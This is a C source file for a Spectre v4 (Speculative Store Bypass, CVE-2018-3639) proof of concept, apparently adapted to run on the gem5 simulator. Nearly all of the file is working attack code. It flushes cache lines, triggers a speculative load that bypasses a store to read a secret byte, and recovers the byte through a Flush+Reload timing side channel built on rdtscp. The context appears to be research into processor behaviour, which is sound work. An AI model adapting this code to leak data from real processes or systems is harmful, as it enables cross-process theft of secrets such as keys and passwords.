/* Implements an SSB attack on gem5 */

/* Modified from: https://github.com/Shuiliusheng/CVE-2018-3639-specter-v4-/blob/master/spectre_v4.cpp */
/* Kudos to Shuiliusheng */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define CACHE_HIT_THRESHOLD (80)
#define NUM_POSSIBLE_ANSWERS 256
#define DEFAULT_SECRET_VALUE 42
#define RED  "\x1B[31m"
#define GRN  "\x1B[32m"
#define YLW  "\x1B[33m"
#define DEFAULT  "\x1B[0m"

uint8_t probe[160] = {255};
size_t str[NUM_POSSIBLE_ANSWERS];

uint8_t secret = 42;

uint8_t cache_test[NUM_POSSIBLE_ANSWERS * 512];

uint64_t temp = 0;
static int a = 10;
static int b = 5;
static int c = 3;
static int d = 999;
static int e = 9;

int attack(size_t malicious_x)
{
	int junk = 0;
	uint64_t times[256];
	register uint64_t start_time;
	volatile uint8_t *addr;
	register uint8_t s;
	
	for (volatile int i = 0; i < 256; i++)
		_mm_clflush(&cache_test[i * 512]);	
	
	_mm_clflush(&a);
	_mm_clflush(&b);
	_mm_clflush(&c);
	_mm_clflush(&d);
	_mm_clflush(&e);
	_mm_clflush(&secret);

	str[3]=malicious_x;
	/* stall */
	for(volatile int j = 0;j < 100; j++);
	
	str[a * b - c * e  - 20] = 0;
	s = probe[str[3]];
	temp &= cache_test[512 * s];

	uint64_t min_time = UINT64_MAX;
    int guess = 0;

	
	for(volatile int j = 0;j < 100; j++);
	
	for (register int i = 0; i < 256; i++)
	{
		addr = &cache_test[i * 512];
		start_time = __rdtscp((unsigned int*)&junk);
		junk &= *addr;
		times[i] = __rdtscp((unsigned int*)&junk) - start_time;
		printf("%i,", i);
		printf("%lu\n", times[i]);
		if(i == 0 || i == probe[0]) continue;
		if (times[i] < min_time) {
            min_time = times[i];
            guess = i;
        }
	}
	return guess;
}

void die_usage(void)
{
    fprintf(stderr, "Usage: ./mdu_mem_dcache_load [secret_value]\n");
    fprintf(stderr, "\twhere secret_value is an int from [1,%u)\n",
        NUM_POSSIBLE_ANSWERS);
    exit(1);
}

int main(int argc, char **argv)
{
    if (argc > 2) {
        die_usage();
    }
    secret = DEFAULT_SECRET_VALUE;
    if (argc == 2) {
        secret = atoi(argv[1]);
    }

    if (secret < 0 || secret >= NUM_POSSIBLE_ANSWERS) {
        die_usage();
    }

	size_t malicious_x=(size_t)(&secret-probe);
	for (int i = 0; i < sizeof(cache_test); i++)
		cache_test[i] = 1;
	int guess = attack(malicious_x);
	if (secret == guess) {
		fprintf(stderr, "Attack succeeded. Secret correctly guessed as %d\n", secret);
	} else {
		fprintf(stderr, "Attack failed. Could not determine the secret (%d)\n", secret);
	}
    return 0;
}